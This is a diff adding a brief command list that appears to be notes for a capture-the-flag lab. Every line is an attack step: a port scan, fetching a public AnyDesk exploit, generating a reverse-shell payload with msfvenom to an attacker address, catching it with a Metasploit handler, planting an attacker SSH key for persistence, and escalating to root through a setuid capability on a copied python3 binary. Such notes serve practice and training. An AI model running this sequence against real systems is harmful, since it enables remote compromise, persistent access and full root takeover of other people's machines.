@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.157.187
+2 - searchsploit "anydesk"
+3 - searchsploit -m 49613
+4 - msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.94.51 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+5 - nano 49613.py
+6 - msfconsole -> use exploit/multi/handler -> set payload linux/x64/shell_reverse_tcp
+7 - python2.7 49613.py
+8 - cat user.txt
+9 - echo "ATTACKER ID_RSA.PUB" > .ssh/authorized_keys
+10 - ssh annie@10.10.157.187
+11 - find / -perm -u=s -type f 2>/dev/null
+12 - cp /usr/bin/python3 .
+13 - /sbin/setcap cap_setuid+ep python3
+14 - ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+15 - cat /root/root.txt
